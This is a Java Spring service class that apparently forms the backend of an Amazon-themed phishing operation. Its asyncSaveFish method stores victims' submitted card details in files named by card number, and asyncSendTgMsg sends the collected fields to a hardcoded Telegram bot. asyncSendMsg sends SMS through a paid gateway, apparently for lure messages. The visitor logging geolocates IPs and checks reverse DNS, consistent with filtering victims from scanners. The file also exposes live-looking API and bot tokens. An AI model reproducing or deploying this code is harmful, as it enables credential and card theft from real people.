package com.kidd.amazon.task;

import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileAppender;
import cn.hutool.core.util.URLUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import com.alibaba.fastjson.JSON;
import com.kidd.amazon.common.CmdUtils;
import com.sun.javafx.scene.shape.PathUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;
import org.springframework.util.StringUtils;

import javax.servlet.http.HttpServletRequest;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Service
@Slf4j
public class AsyncTask {

    private static String ipInterfaceUrl = "http://ip-api.com/json/";
    //private static String ipInterfaceUrl = "https://api.ip.sb/geoip/";

    @Autowired
    private CmdUtils cmdUtils;

    @Async
    public void asyncWriteList(String path, List<String> contents) {
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append("===================================================================");
        for (String content : contents) {
            fileAppender.append(content);
        }
        fileAppender.flush();
    }

    @Async
    public void asyncWriteMap(String path, Map<String, String> map) {
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append("===================================================================");
        for (String key : map.keySet()) {
            fileAppender.append(String.format("%s : %s", key, map.get(key)));
        }
        fileAppender.flush();
    }


    @Async
    public void asyncWriteLog(String ip, String ua, String dateTime, String al, String url, Boolean authBool) {
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyyMMdd");
        String path = String.format("/root/%s/access.log", timeStr);
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append("==================================================");
        fileAppender.append("ip:" + ip);
        fileAppender.append("ua:" + ua);
        fileAppender.append("di:" + dateTime);
        fileAppender.append("al:" + al);
        fileAppender.append("url:" + url);
        fileAppender.append("authBool:" + authBool);
        fileAppender.flush();
    }

    @Async
    public void asyncWriteLogStr(String info) {
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyyMMdd");
        String path = String.format("/root/amazonAccessLog/%s.txt", timeStr);
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append(info + "\n");
        fileAppender.flush();
    }

    @Async
    public void asyncWriteAccessLog(HttpServletRequest request, String ip, String ipfinfo, String rdns, String dateTime,Boolean authBool,String uaStr,String ul) {
        if (StringUtils.isEmpty(ipfinfo)) {
            ipfinfo = HttpRequest.get(ipInterfaceUrl + ip)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .header("accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                    .header("accept-encoding","gzip, deflate, br")
                    .header("accept-language","zh-CN,zh;q=0.9,ja;q=0.8,en-US;q=0.7,en;q=0.6")
                    .header("cookie","__cfduid=d534012ed48873bad8487bfd1d20040821613906936")
                    .timeout(30000)//超时，毫秒
                    .execute()
                    .body();
        }
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyyMMdd");
        String path = String.format("/root/amazonAccessLog/%s/%s.txt",authBool,timeStr);
        String url = request.getRequestURI();
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append("================================================\n");
        if(ipfinfo!=null && ipfinfo.toLowerCase().contains("japan") && !authBool){
            fileAppender.append("ip is japan,but auth false!!!\n");
        }
        fileAppender.append(String.format("authBool : %s\n", authBool));
        fileAppender.append(String.format("ip : %s\n", ip));
        fileAppender.append(String.format("ua : %s\n", uaStr));
        fileAppender.append(String.format("ul : %s\n", ul));
        fileAppender.append(String.format("url : %s\n", url));
        fileAppender.append(String.format("dateTime : %s\n", dateTime));
        Enumeration<String> headerNames = request.getHeaderNames();//获得 n个键名，放回一个Enumeration<String>类型的数据
        while (headerNames.hasMoreElements()) {//.hasMoreElements()返回的是布尔类型的数据
            String headerName = headerNames.nextElement();//获得键
            String headerValue = request.getHeader(headerName);//获得值
            fileAppender.append(String.format("%s : %s\n", headerName, headerValue));
        }
        if (StringUtils.isEmpty(rdns)) {
            //2、校验rdns
            rdns = cmdUtils.queryRdns(ip);
        }
        fileAppender.append(String.format("ipInfo : %s\n", ipfinfo));
        fileAppender.append(String.format("rdns : %s\n", rdns));
        fileAppender.append("================================================\n");
        fileAppender.flush();
    }

    @Async
    public void asyncSendTgMsg(String groupId, String botToken, Map<String, String> map) {
        String msg = "";
        for (String key : map.keySet()) {
            msg += (String.format("%s : %s\n", key, map.get(key)));
        }
        String template = "https://api.telegram.org/bot1512174079:AAFc1hgPXsBQaTYHhXeRo25_an8tP-1eEkA/sendMessage?chat_id=-401293491&text=%s";
        String url = String.format(template, URLUtil.encode(msg));
        String result = HttpRequest.get(url)
                .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                .timeout(50000)//超时，毫秒
                .execute()
                .body();
    }

    @Async
    public void asyncSaveFish(String path, Map<String, String> map) {
        if(!map.containsKey("cardnumber")){
            return;
        }
        String fileName = path + map.get("cardnumber")+".txt";
        if(FileUtil.exist(path)){
            FileUtil.newFile(path);
        }
        if (!FileUtil.exist(fileName)) {
            FileUtil.newFile(fileName);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(fileName), 1000, true);
        fileAppender.append("===================================================================");
        for (String key : map.keySet()) {
            fileAppender.append(String.format("%s : %s", key, map.get(key)));
        }
        fileAppender.flush();
    }

    @Async
    public void asyncSendMsg(String phone,String msg,String sender){
        log.info("start:{} ",phone);
        HashMap<String,String> parmas = new HashMap<>();
        parmas.put("sender", sender);
        parmas.put("content",msg);
        parmas.put("phone",phone);
        String smsUrl = "https://sms.phcomm.biz/api/v1/messages/send";
        String  personalPageResult = HttpRequest.post(smsUrl)
                .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                .header("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                .header("accept-encoding", "gzip, deflate, br")
                .body(JSON.toJSONString(parmas))
                .header("accept-language", "zh-CN,zh;q=0.9,ja;q=0.8,en-US;q=0.7,en;q=0.6")
                .timeout(40000)//超时，毫秒
                .header("Authorization","Bearer 30|HOZ2RtE9ovINp4sLUo3k6pW4ramEDj9j31wzXgis")
                .header("Content-Type","application/json")
                .execute()
                .body();
        log.info("end:{}:{}",phone,personalPageResult);
    }
}
